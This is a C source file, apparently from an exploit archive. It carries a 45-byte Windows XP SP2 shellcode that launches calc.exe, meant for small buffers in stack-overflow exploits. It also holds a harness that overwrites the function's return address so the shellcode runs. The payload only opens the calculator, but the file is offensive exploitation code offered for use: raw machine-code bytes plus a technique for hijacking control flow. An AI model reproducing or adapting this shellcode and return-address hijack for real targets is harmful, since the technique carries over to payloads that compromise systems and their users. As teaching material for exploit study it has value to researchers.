/*
win32/xp sp2 calc.exe 45 bytes
Author : Mountassif Moad
Big Thnx : To my brother iuoisn & His0ka & Jadi ...... Mr.Safa7
Changed by : Stack
First shellcode : http://www.milw0rm.com/exploits/7971
Description : It is 45 Bytes Shellcode which Execute calc.exe Tested Under Windows Xp SP2
for exploited a stack overflow have a small space to put our shellcode xd :d  just for fun :d

*/
#include "stdio.h"
unsigned char shellcode[] =
"\xB8\xFF\xEF\xFF\xFF\xF7\xD0\x2B\xE0\x55\x8B\xEC"
"\x33\xFF\x57\x83\xEC\x04\xC6\x45\xF8\x63\xC6\x45"
"\xF9\x61\xC6\x45\xFA\x6C\xC6\x45\xFB\x63\x8D\x45"
"\xF8\x50\xBB\xC7\x93\xBF\x77\xFF\xD3";
int main ()
{
int *ret;
ret=(int *)&ret+2;
printf("Shellcode Length is : %d",strlen(shellcode));
(*ret)=(int)shellcode;
return 0;
}